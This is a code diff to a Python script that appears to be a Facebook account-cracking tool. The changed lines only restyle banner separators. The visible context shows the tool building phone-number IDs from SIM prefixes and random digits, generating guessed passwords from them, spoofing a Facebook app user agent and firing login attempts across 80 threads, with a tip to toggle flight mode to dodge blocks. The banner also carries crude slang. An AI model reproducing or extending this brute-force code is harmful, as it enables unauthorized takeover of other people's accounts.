@@ -72,7 +72,6 @@ class System:
     
     def banner(self):
         os.system("clear")
-        print("═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━")
         print(f"""
 {faltu} {black}"If you get tired, learn to rest, not to quit".... {pvt}
 \033[1;32m
@@ -85,7 +84,7 @@ class System:
 \033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
         print("FEATURE    : KUXX NHI HAIN BSDK ")
         print("VERSION    : 1.4")
-        print("═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     
     def Main(self):
         self.banner()
@@ -93,7 +92,7 @@ class System:
         code2 = input("ENTER SIM CODE : ")
         code3 = input("ENTER SIM CODE : ")
         limit = int(input("ENTER ID LIMIT : "))
-        print("═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━\n[1] METHOD 1\n[2] METHOD 2\n[3] METHOD 3")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[1] METHOD 1\n[2] METHOD 2\n[3] METHOD 3")
         method_select = input("SELECT METHOD : ")
         for a in range(limit):
             xxx = "".join(random.choice(string.digits) for _ in range(6))
@@ -101,7 +100,7 @@ class System:
         with tred(max_workers=80) as randx:
             self.banner()
             print("IF NO RESULT USE FLIGHT MODE")
-            print("═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━")
+            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
             for love in self.gen:
                 ids = random.choice([code1,code2,code3])+love
                 passlist = [ids[:6],ids,ids[:7],love[:6] ,"57273200"]
@@ -110,7 +109,7 @@ class System:
                 elif method_select == "3":randx.submit(self.method3,ids,passlist)
                 else:randx.submit(self.method3,ids,passlist)
         print("\n")
-        print("═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     
     def samsung_user_agent(self):
         fbav = str(random.randint(111,111))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))
